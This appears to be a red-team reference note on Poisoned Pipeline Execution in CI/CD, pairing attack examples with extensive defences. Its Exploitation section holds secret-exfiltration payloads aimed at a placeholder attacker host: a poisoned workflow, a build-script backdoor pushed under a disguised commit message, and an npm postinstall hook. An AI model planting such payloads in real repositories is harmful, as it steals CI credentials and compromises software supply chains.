# Poisoned Pipeline Execution (PPE)

> OWASP CI/CD-SEC-04. Attacker injects malicious code that runs with CI's identity by modifying a file the pipeline trusts (workflow, build script, lockfile, third-party action). Authorized testing only.

## TL;DR
- Two variants:
  - **Direct PPE (D-PPE)**: attacker modifies the pipeline definition itself (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`) — typically through a merge to a branch the pipeline runs from, or a fork PR for `pull_request_target`-style events.
  - **Indirect PPE (I-PPE)**: attacker modifies a file the pipeline executes — `package.json` postinstall hooks, `Makefile` targets, vendored scripts, sub-action references.
- Public PPE incidents: codecov bash uploader (2021), tj-actions/changed-files compromise patterns, dependency-confusion (see [./dependency-confusion.md](./dependency-confusion.md)).
- Defence is layered: branch protection + CODEOWNERS + signed commits + least-privilege CI token + ephemeral runners.

## Detection / Discovery (red team)

### Where does the pipeline trust uncontrolled input?
| Surface | Why it's dangerous |
| --- | --- |
| `pull_request_target` / `workflow_run` (see [./github-actions.md](./github-actions.md)) | Fork-author code runs with secrets in scope. |
| Pipeline runs scripts checked into the repo (`make ci`, `bash scripts/build.sh`) | Modify the script in a non-protected branch / via a PR that bypasses path-based CODEOWNERS. |
| Pipeline executes language-runtime `pre-install` / `postinstall` / `build` hooks | npm `prepublish` / `postinstall`, pip `setup.py`, gem `.gemspec`, gradle `build.gradle.kts`. |
| Pipeline pulls from a registry pinned by tag/version not digest | Maintainer compromise → tag mutation → next CI run pulls malicious version. |
| Pipeline reads `.env` / config from PR branch | A PR with malicious config drives the pipeline. |
| Self-hosted runners on public repos | Any PR or branch from any contributor runs on your infra. |

### Recon a target's CI
```bash
# Public repo — pull the workflow inventory
gh api repos/<owner>/<repo>/contents/.github/workflows | jq -r '.[].name'
# Look at each workflow for trigger events, secret usage, third-party action pins
for f in $(gh api repos/<owner>/<repo>/contents/.github/workflows --jq '.[].path'); do
  echo "=== $f ==="
  gh api "repos/<owner>/<repo>/contents/$f" --jq '.content' | base64 -d
done
```

## Exploitation

### D-PPE — pipeline definition modification
Scenario: developer has push access to `feature/` branches; CI runs full pipeline on every push to `feature/*`.
```yaml
# .github/workflows/ci.yml (modified)
on: push
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
    - run: |
        echo "${{ secrets.NPM_TOKEN }}" | curl -X POST --data-binary @- https://<attacker>/x
        echo "${{ secrets.DEPLOY_KEY }}" | curl -X POST --data-binary @- https://<attacker>/y
```
Defence is **branch-protection** on `main` and **CODEOWNERS** on `.github/`; many orgs miss the CODEOWNERS path.

### I-PPE — vendored script modification
```bash
# Repo has scripts/build.sh executed by CI on every push
cat >> scripts/build.sh <<'EOF'
# Backdoor — exfil secrets
env | grep -E "(TOKEN|SECRET|KEY|PASS)" | base64 | curl -X POST --data-binary @- https://<attacker>/x
EOF
git commit -am "chore: refactor build helper" && git push origin feature/x
```
A merge to `main` (or a `pull_request` event that builds) runs the backdoor with whatever secrets the pipeline injected.

### I-PPE via language hooks
```json
// package.json (added by attacker in a PR)
{
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://<attacker>/'+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
  }
}
```
`npm install` (CI's first step on a JS project) runs the postinstall hook with full env access.

### I-PPE via third-party action substitution
```yaml
# Innocuous-looking PR change
- uses: foo/bar@v1   # was foo/bar@sha-1234
```
Tag is now mutable by the maintainer; tomorrow's `v1` retag is attacker-controlled.

### Codecov-style supply-chain pattern (2021)
The codecov bash uploader was modified upstream to exfil environment variables; every CI pipeline pulling `https://codecov.io/bash` ran the backdoor. Lesson: scripts piped to bash from third parties are root-equivalent on your CI.

## Bypasses
- Workflow has `if: github.actor == 'trusted-user'` — bypassed by spoofed `head.user.login` in `pull_request_target` if the check is on `head.user.login` rather than the GitHub-authenticated `github.actor`.
- Branch protection requires PR review but `.github/` is not in CODEOWNERS — push directly to `main` via an "auto-merge" workflow change.
- Secrets are scoped per-environment but the workflow accepts a `pull_request_target` from a fork — fork-author chooses the environment via inputs.
- Pre-commit hooks installed in dev only — CI runs without them. Pre-commit on CI side is recommended.

## Defence / Remediation
- **Branch protection** on `main` (and any other release branch) with:
  - Required PR reviews (≥ 1).
  - Required status checks.
  - Required signed commits (`commit-signoff: required`).
  - No bypass for admins.
- **CODEOWNERS includes `.github/`, `Jenkinsfile`, `Makefile`, build scripts, `package.json`, `requirements*.txt`, `*.lock`** — platform-team review required for changes to anything CI executes.
- **Pin every external reference by digest / SHA / lockfile hash** (Docker images by `@sha256:`, GH Actions by commit SHA, npm via `package-lock.json`, pip via hash-pinned `requirements.txt`). Dependabot / Renovate for refresh.
- **Least-privilege CI token**: `permissions:` explicit at workflow level; OIDC-issued cloud tokens scoped per job; no long-lived secrets where avoidable.
- **Ephemeral runners** (GitHub-hosted, or self-hosted with single-job + auto-recycle). Don't keep state between jobs.
- **SBOM + signature verification at deploy** (cosign / Notation; Sigstore Rekor transparency log). See [./sbom-sigstore.md](./sbom-sigstore.md).
- **OpenSSF Scorecard** + **Allstar** for org-wide policy enforcement.
- **CI secret scanning** — alert when a secret hits a build log; rotate immediately.

## Sources
- OWASP Top 10 CI/CD Security Risks — CI/CD-SEC-04 Poisoned Pipeline Execution: https://github.com/cider-security-research/top-10-cicd-security-risks/blob/main/Risks/CICD-SEC-04-Poisoned-Pipeline-Execution.md
- Cider Security (now Palo Alto) PPE research: https://www.paloaltonetworks.com/blog/prisma-cloud/poisoned-pipeline-execution/
- Codecov bash uploader compromise post-mortem: https://about.codecov.io/security-update/
- GitHub Security Lab — pwn-request: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- Sigstore: https://docs.sigstore.dev/
- OpenSSF Best Practices: https://www.bestpractices.dev/
- SLSA framework (Supply-chain Levels for Software Artifacts): https://slsa.dev/
